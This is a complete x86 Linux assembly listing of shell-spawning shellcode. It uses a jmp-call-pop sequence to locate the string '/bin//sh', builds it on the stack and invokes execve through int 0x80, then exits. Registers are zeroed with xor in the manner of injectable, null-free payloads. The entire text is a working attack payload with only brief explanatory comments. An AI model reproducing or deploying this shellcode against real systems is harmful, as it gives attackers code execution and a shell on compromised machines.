global _start

section .text

_start:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    
    jmp short command

copy_binSH:
    cld                 ; Makes sure that movsb copies forward
    mov cl, binSH_len   ; Counter: amount of byte to copy
    mov esi, [esp]      ; Source index: /bin//sh from .text

    push eax            ; Reserved for 0x00000000
    push ebx            ; Reserved for //sh
    push edx            ; Reserved for /bin
    
    mov edi, esp        ; Destination index: Buffer
    rep movsb           ; Copies byte by byte till counter is reached

execve_binSH:
    mov al, 0xB         ; Syscall num for execve()
    mov ebx, esp        ; ebx = /bin//sh
    
    ; [Address of /bin//sh | 0x00000000 | /bin//sh | 0x00000000]
    push edx            ; 0x00000000
    push ebx            ; Address of /bin//sh
    int 0x80            ; Calls kernel
   
exit:
    xor eax, eax
    inc eax             ; eax = 1, sycall num for exit()
    xor ebx, ebx        ; exit code = 0 
    int 0x80            ; Calls kernel

command:
    call copy_binSH
    binSH: db "/bin//sh"     
    binSH_len equ $-binSH   ; Length of /bin//sh
